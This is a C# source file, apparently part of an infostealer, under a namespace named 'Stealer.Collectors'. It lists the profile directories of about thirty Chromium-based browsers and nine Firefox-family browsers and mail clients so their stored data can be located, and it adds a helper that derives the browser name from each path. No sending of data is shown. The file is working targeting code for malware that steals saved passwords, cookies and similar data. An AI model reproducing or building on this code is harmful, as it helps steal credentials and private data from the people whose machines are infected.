using System;
using System.IO;

namespace Stealer.Collectors
{
    public static class BrowserPaths
    {
        private static readonly string AppData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        private static readonly string LocalAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

        public static readonly string[] ChromiumBrowsers = new[]
        {
            Path.Combine(LocalAppData, "Google", "Chrome", "User Data"),
            Path.Combine(LocalAppData, "Microsoft", "Edge", "User Data"),
            Path.Combine(LocalAppData, "BraveSoftware", "Brave-Browser", "User Data"),
            Path.Combine(LocalAppData, "Chromium", "User Data"),
            Path.Combine(LocalAppData, "Vivaldi", "User Data"),
            Path.Combine(AppData, "Opera Software", "Opera Stable"),
            Path.Combine(AppData, "Opera Software", "Opera GX Stable"),
            Path.Combine(LocalAppData, "Yandex", "YandexBrowser", "User Data"),
            Path.Combine(LocalAppData, "CocCoc", "Browser", "User Data"),
            Path.Combine(LocalAppData, "Comodo", "Dragon", "User Data"),
            Path.Combine(LocalAppData, "Epic Privacy Browser", "User Data"),
            Path.Combine(LocalAppData, "Slimjet", "User Data"),
            Path.Combine(LocalAppData, "Torch", "User Data"),
            Path.Combine(LocalAppData, "Uran", "User Data"),
            Path.Combine(LocalAppData, "CentBrowser", "User Data"),
            Path.Combine(LocalAppData, "Elements Browser", "User Data"),
            Path.Combine(LocalAppData, "Kometa", "User Data"),
            Path.Combine(LocalAppData, "Orbitum", "User Data"),
            Path.Combine(LocalAppData, "Sputnik", "Sputnik", "User Data"),
            Path.Combine(LocalAppData, "uCozMedia", "Uran", "User Data"),
            Path.Combine(LocalAppData, "Iridium", "User Data"),
            Path.Combine(LocalAppData, "Maxthon", "User Data"),
            Path.Combine(LocalAppData, "Maxthon3", "User Data"),
            Path.Combine(LocalAppData, "Nichrome", "User Data"),
            Path.Combine(LocalAppData, "QIP Surf", "User Data"),
            Path.Combine(LocalAppData, "CryptoTab Browser"),
            Path.Combine(LocalAppData, "360Browser", "Browser", "User Data"),
            Path.Combine(LocalAppData, "Tencent", "QQBrowser", "User Data"),
            Path.Combine(LocalAppData, "Naver", "Naver Whale", "User Data"),
            Path.Combine(LocalAppData, "Baidu", "BaiduBrowser", "User Data")
        };

        public static readonly string[] GeckoBrowsers = new[]
        {
            Path.Combine(AppData, "Mozilla", "Firefox", "Profiles"),
            Path.Combine(AppData, "Waterfox", "Profiles"),
            Path.Combine(AppData, "K-Meleon", "Profiles"),
            Path.Combine(AppData, "Thunderbird", "Profiles"),
            Path.Combine(AppData, "Comodo", "IceDragon", "Profiles"),
            Path.Combine(AppData, "8pecxstudios", "Cyberfox", "Profiles"),
            Path.Combine(AppData, "NETGATE Technologies", "BlackHaw", "Profiles"),
            Path.Combine(AppData, "Moonchild Productions", "Pale Moon", "Profiles"),
            Path.Combine(AppData, "Ghostery Browser", "Profiles")
        };

        public static string GetBrowserName(string path)
        {
            try
            {
                string[] parts = path.Split(Path.DirectorySeparatorChar);
                
                if (path.Contains("Opera"))
                    return parts[6].Replace(" Stable", "");
                
                return parts[5];
            }
            catch
            {
                return "Unknown";
            }
        }
    }
}
